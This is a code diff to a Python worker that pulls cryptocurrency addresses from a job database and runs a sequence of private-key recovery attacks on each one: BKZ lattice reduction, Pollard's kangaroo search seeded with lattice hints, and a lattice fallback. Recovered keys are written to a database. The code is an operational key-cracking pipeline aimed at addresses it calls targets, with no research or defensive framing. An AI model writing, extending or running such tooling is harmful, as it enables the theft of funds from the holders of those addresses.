@@ -5,8 +5,8 @@ import random
 from base_worker import BaseWorker
 from db_manager import claim_address, release_address, get_connection
 from cryscout_enhanced import run_lattice_attacks_enhanced
-from advanced_lattice import run_advanced_lattice
-from pollard_kangaroo import run_kangaroo_scan
+from advanced_lattice import run_advanced_lattice, progressive_lattice_attack
+from pollard_kangaroo import run_kangaroo_scan, kangaroo_from_lattice_hint
 
 class StrikerWorker(BaseWorker):
     def process_loop(self):
@@ -48,16 +48,34 @@ class StrikerWorker(BaseWorker):
         self.log(f"!!! STARTING INTENSIVE STRIKE ON HIGH-PROBABILITY TARGET: {addr} !!!")
         
         try:
-            # 1. Advanced BKZ Lattice Reduction (More powerful than standard HNP)
+            # 1. Advanced BKZ Lattice Reduction
             self.log(f"Phase 1: Running BKZ Lattice Reduction on {addr}")
-            if run_advanced_lattice(max_addresses=1, target_address=addr):
+            key, hints = progressive_lattice_attack(addr)
+            
+            if key:
+                key_hex = hex(key)[2:].zfill(64)
                 self.log(f"$$$ SUCCESS! Private key recovered for {addr} via BKZ $$$")
+                from db_manager import add_recovered_key
+                add_recovered_key(addr, key_hex, method='Advanced Lattice (BKZ)')
                 release_address(addr, self.worker_id, mark_done=True)
                 return
-            else:
-                from db_manager import update_fail_att
-                update_fail_att(addr, 4)
-            # 2. Pollard's Kangaroo (Bounded ECDLP search - for very small/biased ranges)
+            
+            # 2. Kangaroo with Lattice Hints
+            if hints:
+                self.log(f"Phase 1.5: Running Kangaroo search on {len(hints)} hints for {addr}")
+                for i, hint in enumerate(hints):
+                    self.heartbeat(f"STRIKING: {addr_short} (K-Hint {i+1})")
+                    # Try a 40-bit range around each hint
+                    recovered = kangaroo_from_lattice_hint(addr, hint, range_bits=40)
+                    if recovered:
+                        key_hex = hex(recovered)[2:].zfill(64)
+                        self.log(f"$$$ SUCCESS! Private key recovered for {addr} via Kangaroo Hint $$$")
+                        from db_manager import add_recovered_key
+                        add_recovered_key(addr, key_hex, method='Lattice-Kangaroo Hybrid')
+                        release_address(addr, self.worker_id, mark_done=True)
+                        return
+            
+            # 3. Pollard's Kangaroo (Standard small range scan)
             self.heartbeat(f"STRIKING: {addr_short} (Kangaroo)")
             self.log(f"Phase 2: Running Pollard's Kangaroo bounded search on {addr}")
             if run_kangaroo_scan(max_addresses=1, target_address=addr):
@@ -67,7 +85,8 @@ class StrikerWorker(BaseWorker):
             else:
                 from db_manager import update_fail_att
                 update_fail_att(addr, 4)            
-            # 3. Enhanced Lattice (Standard) as a fallback
+            
+            # 4. Enhanced Lattice (Standard) as a fallback
             self.heartbeat(f"STRIKING: {addr_short} (Lattice)")
             if run_lattice_attacks_enhanced(addr):
                 self.log(f"$$$ SUCCESS! Private key recovered for {addr} via Enhanced Lattice $$$")
@@ -76,6 +95,7 @@ class StrikerWorker(BaseWorker):
             else:
                 from db_manager import update_fail_att
                 update_fail_att(addr, 4)
+                
             # If we reach here, intensive strike failed for now
             self.heartbeat(f"Strike failed: {addr_short}")
             self.log(f"Strike complete for {addr}. No key recovered yet.")
